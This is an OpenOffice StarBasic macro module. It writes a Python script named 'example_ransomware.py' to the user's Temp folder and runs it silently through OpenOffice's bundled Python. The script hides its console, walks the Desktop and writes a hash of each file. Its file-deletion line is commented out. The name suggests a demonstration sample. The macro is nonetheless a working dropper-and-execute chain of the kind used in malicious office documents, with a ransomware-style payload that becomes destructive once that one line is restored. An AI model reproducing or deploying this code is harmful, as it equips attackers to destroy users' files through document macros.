<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****

Sub Main

	Dim oSFA As Object, oOutStream as Object, oOutText as Object
	Dim sFilePath as String
	
	oSFA = createUNOService (&quot;com.sun.star.ucb.SimpleFileAccess&quot;)
	sFilePath = &quot;C:\Users\&quot; + environ(&quot;USERNAME&quot;) + &quot;\AppData\Local\Temp\example_ransomware.py&quot;
	If oSFA.exists(sFilePath) Then
		oSFA.kill(sFilePath) &apos;if file exists, delete it
	End If
	
	oOutStream = oSFA.openFileWrite(sFilePath)
	oOutText = createUNOService (&quot;com.sun.star.io.TextOutputStream&quot;)
	oOutText.setOutputStream(oOutStream)
	
	oOutText.WriteString(&quot;import os&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;import getpass&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;import hashlib&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;import ctypes&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;def hash_and_remove(file):&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;	with open(file, &apos;rb&apos;) as f:&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;		fblock = f.read(block_size)&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;		while len(fblock) &gt; 0:&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;			hash_obj.update(fblock)&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;			fblock = f.read(block_size)&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;	file_hashed = open(file + &apos;.hashed&apos;,&apos;w&apos;)&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;	file_hashed.write(hash_obj.hexdigest())&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;	file_hashed.close()&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;#	os.remove(file)&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;username = getpass.getuser()&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;path = &apos;C:\\Users\\&apos; + username + &apos;\\Desktop\\&apos;&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;hash_obj = hashlib.sha256()&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;block_size = 65536&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;for root, dirs, files in os.walk(path):&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;	for file in files:&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;		file = path + file&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;		try:&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;			hash_and_remove(file)&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;		except:&quot; + Chr(13) + Chr(10))
	oOutText.WriteString(&quot;			pass&quot; + Chr(13) + Chr(10))

	Shell(&quot;C:\Program Files (x86)\OpenOffice 4\program\python.exe &quot; + sFilePath)
	
End Sub
</script:module>